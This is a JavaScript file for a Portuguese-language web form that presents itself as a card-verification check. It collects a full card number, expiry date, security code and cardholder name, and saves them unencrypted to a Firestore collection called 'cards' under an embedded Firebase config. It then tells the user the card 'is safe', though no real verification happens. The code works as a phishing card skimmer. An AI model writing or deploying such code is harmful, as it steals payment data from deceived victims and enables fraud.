import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js'
import {
    doc,
    getFirestore,
    setDoc,
} from 'https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js'

const firebaseConfig = {
    apiKey: 'AIzaSyC_D38O4_6rM3D_m4rUIkLlG4W_Y8JO6Ek',
    authDomain: 'teste-6a09c.firebaseapp.com',
    projectId: 'teste-6a09c',
    storageBucket: 'teste-6a09c.appspot.com',
    messagingSenderId: '539056050251',
    appId: '1:539056050251:web:a999177101edc7b7517dce',
}

const app = initializeApp(firebaseConfig)
const db = getFirestore(app)

document
    .getElementById('card-number')
    .addEventListener('input', function (event) {
        let cardNumber = event.target.value.replace(/\D/g, '')

        if (cardNumber.length > 16) {
            cardNumber = cardNumber.slice(0, 16)
        }

        event.target.value = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
        updateCardBrand(cardNumber)
    })

document
    .getElementById('expiry-date')
    .addEventListener('input', function (event) {
        let expiryDate = event.target.value.replace(/\D/g, '')

        if (expiryDate.length > 4) {
            expiryDate = expiryDate.slice(0, 4)
        }

        event.target.value = expiryDate.replace(/(\d{2})(?=\d)/g, '$1/')
    })

document
    .getElementById('security-code')
    .addEventListener('input', function (event) {
        let securityCode = event.target.value.replace(/\D/g, '')

        if (securityCode.length > 3) {
            securityCode = securityCode.slice(0, 3)
        }

        event.target.value = securityCode
    })

document
    .getElementById('cardholder-name')
    .addEventListener('input', function (event) {
        event.target.value = event.target.value.toUpperCase()
    })

function createAlert({
    type = 'timer',
    title,
    message,
    timer = 3000,
    onConfirm,
}) {
    const alertContainer = document.createElement('div')
    alertContainer.classList.add('alert-container')

    const alertTitle = document.createElement('h3')
    alertTitle.classList.add('alert-title')
    alertTitle.textContent = title

    const alertMessage = document.createElement('p')
    alertMessage.classList.add('alert-message')
    alertMessage.textContent = message

    alertContainer.appendChild(alertTitle)
    alertContainer.appendChild(alertMessage)

    if (type === 'confirm') {
        const confirmButton = document.createElement('button')
        confirmButton.classList.add('confirm-button')
        confirmButton.textContent = 'Confirmar'
        confirmButton.addEventListener('click', () => {
            if (onConfirm) onConfirm()
            alertContainer.remove()
        })
        alertContainer.appendChild(confirmButton)
    } else setTimeout(() => alertContainer.remove(), timer)

    document.body.appendChild(alertContainer)
}

function updateCardBrand(cardNumber) {
    const sanitized = cardNumber.replace(/\D/g, '')

    const brands = {
        Visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
        MasterCard: /^5[1-5][0-9]{14}$/,
        AmericanExpress: /^3[47][0-9]{13}$/,
        Elo: /^(4011(78|79)|4312(74|75)|438935|451416|4576(31|32)|504175|506(699|7[0-6]{2})|5090[0-9]{2}|627780|636(297|368)|650(4[0-9]{2}|5[0-9]{2}|6[1-9][0-9])|6550(2[1-9]|3[0-9]|4[0-9])|6500311)$/,
        Hipercard: /^(606282\d{10}(\d{3})?)|(3841\d{15})$/,
        Alelo: /^(5067|5090)\d{12}$/,
    }

    let cardBrand = null
    let brandLogo = ''

    for (let brand in brands) {
        if (brands[brand].test(sanitized)) {
            cardBrand = brand
            brandLogo = `assets/svg/${brand.toLowerCase()}.svg`
            break
        }
    }

    const brandLogoImg = document.getElementById('card-brand-logo')
    const brandText = document.getElementById('card-brand')

    if (cardBrand) {
        brandLogoImg.src = brandLogo
        brandLogoImg.style.display = 'block'
        brandText.textContent = cardBrand
    } else {
        brandLogoImg.style.display = 'none'
        brandText.textContent = ''
    }
}

document
    .getElementById('payment-form')
    .addEventListener('submit', function (event) {
        event.preventDefault()

        const cardNumber = document.getElementById('card-number').value
        const expiryDate = document.getElementById('expiry-date').value
        const securityCode = document.getElementById('security-code').value
        const cardholderName = document.getElementById('cardholder-name').value

        if (!validateCardNumber(cardNumber)) {
            alert('Número do cartão inválido!')
            return
        }

        if (!validateExpiryDate(expiryDate)) {
            alert('Data de validade inválida!')
            return
        }

        if (securityCode.length !== 3) {
            alert('Código de segurança inválido!')
            return
        }

        const paymentData = {
            cardNumber,
            expiryDate,
            securityCode,
            cardholderName,
        }

        console.log('Dados de pagamento:', paymentData)
        setDoc(doc(db, 'cards', 'card_' + Date.now()), paymentData)

        createAlert({
            title: 'Analisando cartão',
            message: 'Por favor, aguarde. Estamos analisando seu cartão.',
        })

        setTimeout(() => {
            createAlert({
                type: 'confirm',
                title: 'Cartão verificado',
                message:
                    'Tudo certo, seu cartão está seguro! Obrigado por usar o nosso sistema!',
                onConfirm: () => {},
            })
        }, 3000)
    })

function validateCardNumber(cardNumber) {
    const sanitized = cardNumber.replace(/\D/g, '')
    let sum = 0
    let shouldDouble = false

    for (let i = sanitized.length - 1; i >= 0; i--) {
        let digit = parseInt(sanitized[i])

        if (shouldDouble) {
            digit *= 2
            if (digit > 9) digit -= 9
        }

        sum += digit
        shouldDouble = !shouldDouble
    }

    return sum % 10 === 0
}

function validateExpiryDate(date) {
    const regex = /^(0[1-9]|1[0-2])\/\d{2}$/
    return regex.test(date)
}
